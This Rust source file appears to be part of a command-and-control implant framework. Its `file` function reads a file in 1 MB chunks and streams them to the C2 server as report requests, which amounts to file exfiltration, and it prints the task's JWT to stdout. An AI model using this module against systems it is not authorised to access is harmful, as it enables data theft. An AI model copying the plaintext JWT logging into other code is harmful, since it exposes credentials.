use alloc::boxed::Box;
use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::fs::File;
use std::io::{BufReader, Read};

struct FileChunkIterator {
    reader: BufReader<File>,
    path: String,
    task_context: Option<TaskContext>,
    buffer: Vec<u8>,
}

impl Iterator for FileChunkIterator {
    type Item = c2::ReportFileRequest;

    fn next(&mut self) -> Option<Self::Item> {
        let n = match self.reader.read(&mut self.buffer) {
            Ok(0) => return None,
            Ok(n) => n,
            Err(e) => {
                // We can't return an error easily from Iterator unless Item is Result.
                // For now, we terminate the stream.
                // In a real scenario, we might want to log this.
                #[cfg(feature = "std")]
                eprintln!("Error reading file chunk: {}", e);
                return None;
            }
        };

        let chunk_data = self.buffer[..n].to_vec();

        // Metadata only needed on first chunk? Or context?
        // We attach metadata to the first chunk.
        let metadata = if self.task_context.is_some() {
            Some(eldritch::FileMetadata {
                path: self.path.clone(),
                ..Default::default()
            })
        } else {
            None
        };

        let file_msg = eldritch::File {
            metadata,
            chunk: chunk_data,
        };

        let context = self.task_context.take();

        if context.is_some() {
            println!(
                "reporting file chunk with JWT: {}",
                context.as_ref().unwrap().jwt
            );
        }

        Some(c2::ReportFileRequest {
            context,
            chunk: Some(file_msg),
        })
    }
}

pub fn file(agent: Arc<dyn Agent>, task_context: TaskContext, path: String) -> Result<(), String> {
    let f = File::open(&path).map_err(|e| e.to_string())?;
    let reader = BufReader::new(f);

    let iter = FileChunkIterator {
        reader,
        path,
        task_context: Some(task_context),
        buffer: vec![0u8; 1024 * 1024], // 1MB
    };

    agent.report_file(Box::new(iter)).map(|_| ())
}
